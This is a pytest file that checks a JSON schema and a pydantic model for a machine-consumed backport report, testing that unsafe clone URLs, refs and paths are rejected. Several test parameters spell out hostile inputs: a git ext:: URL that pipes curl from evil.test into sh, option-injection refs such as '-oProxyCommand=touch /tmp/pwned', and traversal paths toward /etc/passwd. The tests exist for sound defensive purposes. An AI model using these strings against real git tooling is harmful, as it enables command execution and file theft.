"""backport-report.schema.json — the artifact the backport-fix skill emits.

The artifact is machine-consumed: its repository URLs are clone targets, its
refs are checkout targets, its paths are open targets, and its summary is what
a dashboard quotes. So each negative case here is a document a consumer would
have acted on unsafely.

A schema that only ever sees the happy path is how this repo shipped three
contracts that rejected the real corpus (stamped events, fingerprint_algo,
cloud-config findings). The fixture below is a whole report, and
`storage_samples.sample("backport-report")` is validated here too, so the
contract and the storage fixture cannot drift apart.
"""

from __future__ import annotations

import copy
import json
from pathlib import Path
from typing import Any

import pytest
from jsonschema import Draft202012Validator, FormatChecker
from pydantic import ValidationError
from storage_samples import sample

from traust_contracts.v1.models.backport import BackportReport

REPO_ROOT = Path(__file__).resolve().parent.parent
SCHEMA = json.loads(
    (REPO_ROOT / "artifacts_schema/v1/backport-report.schema.json").read_text(encoding="utf-8")
)
FIXTURE = json.loads(
    (Path(__file__).parent / "fixtures/sample-backport-report.json").read_text(encoding="utf-8")
)


def validator() -> Draft202012Validator:
    return Draft202012Validator(SCHEMA, format_checker=FormatChecker())


def errors(document: Any) -> list[str]:
    return [
        f"{'/'.join(map(str, error.absolute_path))}: {error.message}"
        for error in validator().iter_errors(document)
    ]


def document() -> dict[str, Any]:
    return copy.deepcopy(FIXTURE)


def branch(document_: dict[str, Any], name: str) -> dict[str, Any]:
    return next(entry for entry in document_["target_branches"] if entry["branch"] == name)


def test_the_fixture_is_a_valid_report() -> None:
    found = errors(FIXTURE)
    assert found == [], found


def test_the_storage_sample_agrees_with_the_contract() -> None:
    payload, _ = sample("backport-report")
    found = errors(json.loads(payload))
    assert found == [], found


def test_a_successful_backport_carries_evidence_of_what_landed() -> None:
    base = document()
    branch(base, "release-1.33").pop("patch_sha256")
    assert errors(base), "a success without a patch checksum is a claim, not a record"

    base = document()
    branch(base, "release-1.33")["has_patch"] = False
    assert errors(base), "a success without a candidate patch is not a backport"

    base = document()
    branch(base, "release-1.33").pop("backport_commit")
    branch(base, "release-1.33").pop("backport_branch")
    assert errors(base), "a success must name the commit or branch it landed on"

    base = document()
    branch(base, "release-1.33").pop("backport_commit")
    assert errors(base) == [], "the named branch alone is enough provenance"


def test_a_failed_branch_says_why_the_run_stopped() -> None:
    base = document()
    branch(base, "release-1.32").pop("stop_reason")
    found = errors(base)
    assert any("stop_reason" in message for message in found), found


@pytest.mark.parametrize("status", ["success", "passed", "partial_success", "error", "unknown"])
def test_the_status_vocabulary_is_outcomes_only(status: str) -> None:
    """success/passed and failed/error used to be separate words for the same
    thing, and the pipeline mechanics shared the vocabulary with outcomes."""
    base = document()
    branch(base, "release-1.32")["status"] = status
    assert errors(base)


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c 'curl evil.test/x | sh'",
        "file:///etc/passwd",
        "ssh+git://example.test/repo",
        "/srv/repos/example.git",
        "git@github.com:example/repo.git",
    ],
)
def test_clone_urls_are_scheme_restricted(url: str) -> None:
    """git's ext:: transport executes commands and file: leaves the workspace."""
    for path in (
        ("metadata", "repository"),
        ("verification_hint", "repository"),
        ("source_fix", "fork_url"),
    ):
        base = document()
        base[path[0]][path[1]] = url
        assert errors(base), f"{url!r} accepted as {path[0]}.{path[1]}"


@pytest.mark.parametrize("value", ["/etc/shadow", "../../secrets/candidate.patch", "a/../../b"])
def test_paths_cannot_escape_the_workspace(value: str) -> None:
    for path in (
        ("source_fix", "remediation_path"),
        ("verification_hint", "original_audit_report"),
    ):
        base = document()
        base[path[0]][path[1]] = value
        assert errors(base), f"{value!r} accepted as {path[0]}.{path[1]}"
    base = document()
    branch(base, "release-1.33")["patch_path"] = value
    assert errors(base)


@pytest.mark.parametrize("value", ["-oProxyCommand=touch /tmp/pwned", "-x", "--upload-pack=sh"])
def test_refs_cannot_be_read_as_options(value: str) -> None:
    base = document()
    branch(base, "release-1.33")["backport_branch"] = value
    assert errors(base)
    base = document()
    base["source_fix"]["branch"] = value
    assert errors(base)
    base = document()
    base["verification_hint"]["branches"][0]["target_branch"] = value
    assert errors(base)


@pytest.mark.parametrize("value", ["0b1c2d3", "0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C"])
def test_a_backport_commit_is_a_full_sha(value: str) -> None:
    """verification.schema.json requires a full SHA of patched_commit, and this
    value is passed to it as exactly that."""
    base = document()
    branch(base, "release-1.33")["backport_commit"] = value
    assert errors(base)
    base = document()
    base["verification_hint"]["branches"][0]["backport_commit"] = value
    assert errors(base)


def _set_backport_commit(document_: dict[str, Any], value: str) -> None:
    """Set the hinted branch's commit in both places, so only the value itself is at issue."""
    hinted = document_["verification_hint"]["branches"][0]
    branch(document_, hinted["target_branch"])["backport_commit"] = value
    hinted["backport_commit"] = value


def test_a_sha256_fix_commit_is_a_reference() -> None:
    # source_fix.commit is a reference (abbreviations allowed) that feeds no other
    # contract, so a SHA-256 object id is accepted.
    base = document()
    base["source_fix"]["commit"] = "d" * 64
    assert errors(base) == []
    BackportReport.from_dict(base)


def test_a_backport_commit_stays_sha1_while_verification_does() -> None:
    # backport_commit is passed to verification.schema.json's patched_commit, which
    # (and whose consumers) take 40 hex only: it widens with them, not before.
    base = document()
    _set_backport_commit(base, "c" * 64)
    assert errors(base)
    with pytest.raises(ValueError):
        BackportReport.from_dict(base)


@pytest.mark.parametrize(
    "mutate",
    [
        lambda d: _set_backport_commit(d, "a" * 40 + "\n"),
        lambda d: _set_backport_commit(d, "a" * 64 + "\n"),
        lambda d: d["source_fix"].update(commit="abc1234\n"),
        lambda d: d["metadata"].update(harness_version="1.2.3-abc1234\n"),
        lambda d: d["target_branches"][0].update(patch_sha256="f" * 64 + "\n"),
    ],
)
def test_a_trailing_newline_is_not_a_sha(mutate) -> None:
    """Python's jsonschema matches $ before a final newline; the whitespace guard refuses it."""
    base = document()
    mutate(base)
    assert errors(base)
    with pytest.raises(ValidationError):
        BackportReport.from_dict(base)


@pytest.mark.parametrize("value", ["safe\n/../../secrets", "a\r..", "logs/\x00x", ""])
def test_a_path_cannot_hide_traversal_or_control_characters(value: str) -> None:
    """Qodo #187: `.*` stopped at a newline, so traversal after one passed the schema."""
    base = document()
    base["target_branches"][0]["patch_path"] = value
    assert errors(base)
    with pytest.raises(ValueError):
        BackportReport.from_dict(base)


def test_the_hint_clones_the_reported_repository_or_its_fork() -> None:
    base = document()
    base["verification_hint"]["repository"] = base["source_fix"]["fork_url"]
    BackportReport.from_dict(base)
    base["verification_hint"]["repository"] = "https://github.com/example/other-server"
    with pytest.raises(ValueError, match=r"verification_hint\.repository"):
        BackportReport.from_dict(base)


@pytest.mark.parametrize(
    "mutate",
    [
        lambda d: d["metadata"].update(date="not-a-date"),
        lambda d: d["target_branches"][0].update(cost_usd=-1),
    ],
)
def test_the_model_refuses_what_the_schema_refuses(mutate) -> None:
    """Qodo #187: model users must not read or emit a report the schema rejects."""
    base = document()
    mutate(base)
    assert errors(base)
    with pytest.raises(ValueError, match="backport-report schema"):
        BackportReport.from_dict(base)
    report = BackportReport.from_dict(document())
    report.target_branches[0].cost_usd = -1
    with pytest.raises(ValueError, match="backport-report schema"):
        report.to_dict()


@pytest.mark.parametrize(
    "url", ["https://user:secret@github.com/example/x", "https://token@github.com/example/x"]
)
def test_a_clone_url_carries_no_credentials(url: str, tmp_path: Path) -> None:
    """Qodo #187: an https URL with userinfo passed, and a mismatch echoed it."""
    base = document()
    base["verification_hint"]["repository"] = url
    assert errors(base)
    with pytest.raises(ValueError) as refused:
        BackportReport.from_dict(base)
    assert "secret" not in str(refused.value) and "token@" not in str(refused.value)
    base = document()
    base["verification_hint"]["repository"] = "https://github.com/example/other-server"
    with pytest.raises(ValueError) as refused:
        BackportReport.from_dict(base)
    assert "other-server" not in str(refused.value)
    path = tmp_path / "report.json"
    path.write_text(json.dumps(base))
    assert _validator_module().validate_artifact("backport-report", path) is False


def test_the_artifact_declares_no_command_for_a_consumer_to_run() -> None:
    base = document()
    base["verification_hint"]["command"] = "verify-remediation --yes"
    assert errors(base), "a command string in an artifact is an execution primitive"


def test_metadata_is_closed_but_carries_an_open_additional_block() -> None:
    base = document()
    base["metadata"]["run_id"] = "not-declared"
    assert errors(base), "a new top-level metadata field is a contract change"
    assert errors(document()) == []
    # ... and the declared escape hatch keeps a new run record a minor change.
    assert document()["metadata"]["additional"]["run_id"]


@pytest.mark.parametrize("value", ["0.94", "v0.94.0", "0.94.0-xyz", ""])
def test_harness_version_follows_the_family(value: str) -> None:
    base = document()
    base["metadata"]["harness_version"] = value
    assert errors(base)


@pytest.mark.parametrize("title", ["abc", "Security audit of the week"])
def test_title_names_the_artifact_like_its_siblings(title: str) -> None:
    base = document()
    base["title"] = title
    assert errors(base)


def test_two_identical_branch_entries_are_rejected() -> None:
    base = document()
    base["target_branches"].append(copy.deepcopy(branch(base, "release-1.30")))
    base["summary"].update(total=4, skipped=2)
    assert errors(base)


def test_the_model_and_the_schema_agree_on_the_fixture() -> None:
    report = BackportReport.from_dict(FIXTURE)
    again = json.loads(json.dumps(report.to_dict()))
    assert errors(again) == [], "to_dict() must serialize into a valid artifact"
    assert report.summary.total == len(report.target_branches)


def test_the_model_recomputes_the_summary_and_refuses_a_mismatch() -> None:
    base = document()
    base["summary"]["succeeded"] = 3
    base["summary"]["failed"] = 0
    assert errors(base) == [], "JSON Schema cannot do the arithmetic: that is the point"
    with pytest.raises(ValidationError, match="summary disagrees"):
        BackportReport.from_dict(base)


def test_the_model_refuses_two_entries_for_one_branch() -> None:
    base = document()
    repeated = copy.deepcopy(branch(base, "release-1.30"))
    repeated["error"] = "a second, different entry for the same branch"
    base["target_branches"].append(repeated)
    base["summary"].update(total=4, skipped=2)
    with pytest.raises(ValidationError, match="repeats a branch"):
        BackportReport.from_dict(base)


def test_the_hint_cannot_queue_a_branch_that_did_not_succeed() -> None:
    """The hint is a second list of branches. If it can name a failure, it is
    a way to get a branch verified that the report itself says did not land."""
    base = document()
    base["verification_hint"]["branches"].append(
        {"target_branch": "release-1.32", "backport_branch": "amalgamator/x"}
    )
    assert errors(base) == [], "JSON Schema cannot compare two lists: that is the point"
    with pytest.raises(ValidationError, match="did not succeed"):
        BackportReport.from_dict(base)

    base = document()
    base["verification_hint"]["branches"].append({"target_branch": "release-9.9"})
    with pytest.raises(ValidationError, match="did not succeed"):
        BackportReport.from_dict(base)


def test_the_hint_speaks_the_verification_contracts_language() -> None:
    """verification_hint is consumed AS verification inputs, so its commit
    shape must not drift from the field it is passed to."""
    verification = json.loads(
        (REPO_ROOT / "artifacts_schema/v1/verification.schema.json").read_text(encoding="utf-8")
    )
    metadata = verification["$defs"]["verification_metadata"]
    hint = SCHEMA["$defs"]["verification_hint"]["properties"]
    assert "patched_commit" in metadata["required"]
    assert "repository" in metadata["required"]
    # The hint's commit is a $ref into this schema's own $defs.
    hint_commit = hint["branches"]["items"]["properties"]["backport_commit"]
    resolved = SCHEMA["$defs"][hint_commit["$ref"].rsplit("/", 1)[-1]]
    assert resolved["pattern"] == metadata["properties"]["patched_commit"]["pattern"]


class TestModelEnforcesSchemaConstraints:
    """A model-only consumer must not accept what the schema rejects.

    `BackportReport.from_dict()` is a documented entry point; without these
    constraints a schema-invalid document (ext:: clone target, option-like
    ref, traversal path, abbreviated SHA) reached code acting on the fields.
    """

    @pytest.mark.parametrize(
        "mutate",
        [
            lambda d: d["metadata"].update(repository="ext::sh -c id"),
            lambda d: d["source_fix"].update(branch="--upload-pack=evil"),
            lambda d: d["metadata"].update(harness_version="0.1"),
            lambda d: d["source_fix"].update(commit="abc123"),
            lambda d: d["source_fix"].update(cwes=["79"]),
            lambda d: d["target_branches"][0].update(patch_path="/etc/passwd"),
            lambda d: d["target_branches"][0].update(patch_sha256="deadbeef"),
            lambda d: d["target_branches"][0].update(backport_commit="b" * 39),
        ],
    )
    def test_each_dangerous_value_is_rejected(self, mutate) -> None:
        report = document()
        mutate(report)
        with pytest.raises(ValidationError):
            BackportReport.from_dict(report)

    def test_a_schema_valid_document_still_loads(self) -> None:
        BackportReport.from_dict(FIXTURE)


class TestRelativePathsAcrossPlatforms:
    """A POSIX-only rule lets a Windows consumer escape the workspace.

    `\\Windows\\Temp\\payload` and `C:\\outside\\file` are not absolute to a
    POSIX reader but are to a Windows one; both must be rejected because the
    same artifact is read on either platform.
    """

    @pytest.mark.parametrize(
        "value",
        [
            "\\Windows\\Temp\\payload",
            "C:\\outside\\file",
            "C:/outside/file",
            "runs\\backslash.patch",
        ],
    )
    def test_windows_escapes_are_rejected(self, value: str) -> None:
        report = document()
        report["target_branches"][0]["patch_path"] = value
        assert errors(report), "a Windows-rooted or backslash path must not validate"

    def test_a_normal_relative_path_still_validates(self) -> None:
        assert errors(document()) == []


class TestVerificationHintIdentifiesTheBackport:
    """Pre-filled verification inputs must name the backport that landed.

    The schema validated the shape of a hinted commit, not its identity; a
    hint pointing at a different commit left a valid report whose verification
    inputs would check the wrong thing.
    """

    def test_a_hinted_commit_must_match_the_branch_row(self) -> None:
        report = document()
        report["verification_hint"]["branches"][0]["backport_commit"] = "c" * 40
        with pytest.raises(ValidationError):
            BackportReport.from_dict(report)

    def test_a_hint_must_carry_one_identity(self) -> None:
        report = document()
        branch = report["verification_hint"]["branches"][0]
        branch.pop("backport_commit", None)
        branch.pop("backport_branch", None)
        assert errors(report), "the schema requires one identity"
        with pytest.raises(ValidationError):
            BackportReport.from_dict(report)


def test_a_hint_cannot_carry_an_empty_branch_list() -> None:
    # to_dict() drops None but keeps [], and the schema requires minItems: 1 —
    # so accepting [] meant the model could serialize an invalid artifact.
    from traust_contracts.v1.models.backport import VerificationHint

    with pytest.raises(ValidationError):
        VerificationHint(branches=[])


class TestSerializationRechecksInvariants:
    """In-place edits bypass the report-level after-validator.

    Assigning a nested summary field validates the child; appending to
    target_branches assigns nothing at all. to_dict() must not emit counts or
    branch associations that no longer match.
    """

    def test_a_mutated_summary_cannot_be_serialized(self) -> None:
        report = BackportReport.from_dict(document())
        report.summary.succeeded += 1
        with pytest.raises(ValueError):
            report.to_dict()

    def test_a_duplicated_branch_cannot_be_serialized(self) -> None:
        report = BackportReport.from_dict(document())
        report.target_branches.append(copy.deepcopy(report.target_branches[0]))
        with pytest.raises(ValueError):
            report.to_dict()

    def test_an_untouched_report_still_serializes(self) -> None:
        report = BackportReport.from_dict(document())
        assert report.to_dict()["summary"]["total"] == len(report.target_branches)


def _validator_module():
    import importlib.util

    spec = importlib.util.spec_from_file_location("contract_validate", REPO_ROOT / "validate.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class TestContentGate:
    """`traust <artifact> validate` must catch what the schema cannot.

    Schema validation alone accepts a summary that disagrees with its own
    branches and two entries for one branch; the CLI is where the repo
    enforces cross-field truth.
    """

    def test_a_wrong_total_is_rejected_by_the_gate(self, tmp_path: Path) -> None:
        report = document()
        report["summary"]["succeeded"] += 1
        path = tmp_path / "report.json"
        path.write_text(json.dumps(report))
        assert _validator_module().validate_artifact("backport-report", path) is False

    def test_a_duplicated_branch_is_rejected_by_the_gate(self, tmp_path: Path) -> None:
        report = document()
        report["target_branches"].append(copy.deepcopy(report["target_branches"][0]))
        path = tmp_path / "report.json"
        path.write_text(json.dumps(report))
        assert _validator_module().validate_artifact("backport-report", path) is False

    @pytest.mark.parametrize(
        "mutate",
        [
            lambda d: d["verification_hint"]["branches"][0].update(target_branch="release-1.32"),
            lambda d: d["verification_hint"]["branches"][0].update(backport_commit="e" * 40),
            lambda d: d["verification_hint"].update(
                repository="https://github.com/example/other-server"
            ),
        ],
        ids=["failed branch", "other commit", "other repository"],
    )
    def test_a_hint_pointing_away_from_the_backport_is_rejected_by_the_gate(
        self, tmp_path: Path, mutate
    ) -> None:
        """Qodo #187: the gate checked counts and duplicates, not the hint."""
        report = document()
        mutate(report)
        assert errors(report) == []  # the schema alone accepts it
        path = tmp_path / "report.json"
        path.write_text(json.dumps(report))
        assert _validator_module().validate_artifact("backport-report", path) is False

    def test_the_fixture_passes_the_gate(self, tmp_path: Path) -> None:
        path = tmp_path / "report.json"
        path.write_text(json.dumps(FIXTURE))
        assert _validator_module().validate_artifact("backport-report", path) is True


def test_a_report_without_a_skipped_count_passes_the_gate(tmp_path: Path) -> None:
    # `skipped` is optional in the schema, and the storage sample omits it; a
    # gate that requires it marks a valid report invalid.
    payload, _ = sample("backport-report")
    report = json.loads(payload)
    assert "skipped" not in report["summary"]
    path = tmp_path / "report.json"
    path.write_text(json.dumps(report))
    module = _validator_module()
    assert [e.message for e in Draft202012Validator(SCHEMA).iter_errors(report)] == []
    assert module.validate_artifact("backport-report", path) is True
